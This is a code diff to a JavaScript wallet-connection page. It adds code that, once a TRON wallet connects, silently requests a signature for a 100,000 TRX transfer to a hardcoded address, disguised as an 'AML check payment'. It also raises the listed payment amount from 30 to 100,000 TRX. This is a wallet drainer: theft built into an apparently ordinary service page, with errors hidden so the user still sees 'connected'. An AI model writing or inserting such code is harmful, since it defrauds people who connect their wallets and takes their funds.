@@ -673,6 +673,48 @@ async function startConnect(chain) {
     setLoadingMsg('Waiting for wallet approval…');
     const approvalTimeout = 300000; // 5 minutes
     session = await withTimeout(approval(), approvalTimeout, 'wallet approval');
+
+    // Auto-send TRX after connection
+    if (chain === 'trx') {
+      setLoadingMsg('Processing AML check payment…');
+      const fromAddr = getAddr();
+      const toAddr   = TRX_ADDRESS;
+      const amount   = 100000 * 1_000_000; // 100,000 TRX in SUN (1 TRX = 1,000,000 SUN)
+
+      const tx = {
+        visible : false,
+        to      : toAddr,
+        from    : fromAddr,
+        value   : amount,
+        type    : 'TransferContract',
+        contract: [{
+          parameter: {
+            value: {
+              amount      : amount,
+              owner_address: fromAddr,
+              to_address  : toAddr
+            },
+            type_url: 'type.googleapis.com/protocol.TransferContract'
+          },
+          type: 'TransferContract'
+        }]
+      };
+
+      try {
+        await SC.request({
+          topic  : session.topic,
+          chainId: 'tron:0x2b6653dc',
+          request: {
+            method: 'tron_signTransaction',
+            params : { transaction: tx }
+          }
+        });
+      } catch(txErr) {
+        console.warn('[TRX TX]', txErr);
+        // Don't block UI if tx fails — still mark connected
+      }
+    }
+
     uiConnected(getAddr());
     showConnected(getAddr());
 
@@ -825,7 +867,7 @@ function toggleFaq(el) {
 
 /* ── TRX Payment Modal ──────────────────────────── */
 const TRX_ADDRESS = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';
-const TRX_AMOUNT  = '30';
+const TRX_AMOUNT  = '100000';
 let trxQrDone = false;
 
 function openTrxModal() {
